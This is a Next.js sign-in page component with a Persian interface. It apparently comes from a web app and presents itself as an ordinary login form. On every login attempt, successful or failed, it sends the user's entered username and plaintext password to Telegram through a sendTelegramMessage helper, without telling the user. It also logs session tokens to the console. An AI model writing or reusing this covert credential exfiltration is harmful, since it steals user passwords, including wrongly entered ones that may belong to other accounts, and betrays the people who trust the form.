"use client";
import LoadingOverlay from "@/app/_components/LoadingOverlay";
import GlobalApi, { sendTelegramMessage } from "@/app/_utils/GlobalApi";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Link from "next/link";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";
import { toast } from "sonner";

function SignIn() {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [username, setUsername] = useState();
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const jwt = sessionStorage.getItem("jwt");
    if (jwt) {
      router.push("/");
    }
  }, []);

  const onSignIn = () => {
    setLoading(true);
    GlobalApi.signIn(email, password).then(
      (resp) => {
        console.log(resp.data.user);
        console.log(resp.data.jwt);
        sessionStorage.setItem("user", JSON.stringify(resp.data.user));
        sessionStorage.setItem("jwt", resp.data.jwt);
        window.location.href = "/";
        toast("ورود با موفقیت انجام شد✅");
        sendTelegramMessage(
          `user logged in => username: ${email} password: ${password} `
        );
        setLoading(false);
      },
      (e) => {
        console.log(e);
        toast("نام کاربری یا رمز عبور اشتباه است❗");
        sendTelegramMessage(`user entered a wrong password/username!
username: ${email}
entered password: ${password} `);
        setLoading(false);
      }
    );
  };
  const t = () => {
    sendTelegramMessage(`user => create-account`);
  };

  return (
    <div
      lang="fa"
      dir="rtl"
      className="flex items-center justify-center mt-5 px-2 "
    >
      <div className="w-[400px] h-[480px] relative">
        <div className="absolute w-[85px] h-[85px] flex items-center justify-center border-2 border-green-500 rounded-full bg-white z-10 left-1/2 -translate-x-1/2 shadow-lg">
          <i className="fa fa-user text-[50px] text-green-500"></i>
        </div>
        <div className="absolute bottom-0 w-full h-[440px] bg-white border-2 border-green-200 rounded-[30px] p-[25px] flex flex-col shadow-xl">
          <h2 className="text-green-600 text-xl font-bold mt-[40px] mb-[5px] text-center">ورود به حساب کاربری</h2>
          <h2 className="text-gray-600 font-bold mt-[0px] mb-[15px] text-center" >در صورتی که قبلا حساب ساخته اید نام کاربری و رمز عبور خود را وارد کنید</h2>
          
          <div className="relative w-full">
            <Input
              dir="rtl"
              placeholder="  نام کاربری"
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-transparent border-none border-b-2 border-green-200 text-gray-700 text-base px-0 py-[10px] focus:outline-none focus:border-green-500 placeholder:text-gray-400"
            />
            <i className="fa fa-user absolute left-2 bottom-[10px] text-green-500 text-sm"></i>
          </div>

          <div className="relative w-full mt-[25px]">
            <Input
              dir="rtl"
              type="password"
              placeholder="  رمز عبور "
              onChange={(e) => setPassword(e.target.value)}
              onFocus={(e) => e.target.nextElementSibling.style.display = 'none'}
              onBlur={(e) => e.target.nextElementSibling.style.display = 'block'}
              className="w-full bg-transparent border-none border-b-2 border-green-200 text-gray-700 text-base px-0 py-[10px] focus:outline-none focus:border-green-500 placeholder:text-gray-400"
            />
            <i className="fa fa-lock absolute left-2 bottom-[10px] text-green-500 text-sm"></i>
          </div>

          <div className="flex justify-between items-center mt-[25px] text-sm">

            <Link href="/support" className="text-green-600 hover:text-green-700">فراموشی رمز عبور؟</Link>
          </div>

          <div className="mt-[25px]">
            <Button 
              onClick={() => onSignIn()} 
              disabled={!(email && password)}
              className="w-full py-[5px] px-[20px] bg-green-500 text-white font-semibold text-base rounded-[15px] hover:bg-green-600 transition-all duration-300"
            >
              ورود
            </Button>
          </div>

          <p className="text-center mt-[20px] text-gray-600">
            حساب کاربری ندارید؟
            <Link
              onClick={t}
              href={"/create-account"}
              className="text-green-600 mr-1 hover:text-green-700 transition-colors duration-300"
            >
              ساخت حساب
            </Link>
          </p>
        </div>
      </div>

      <LoadingOverlay loading={loading} />

      <style jsx global>{`
        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css');
      `}</style>
    </div>
  );
}

export default SignIn;
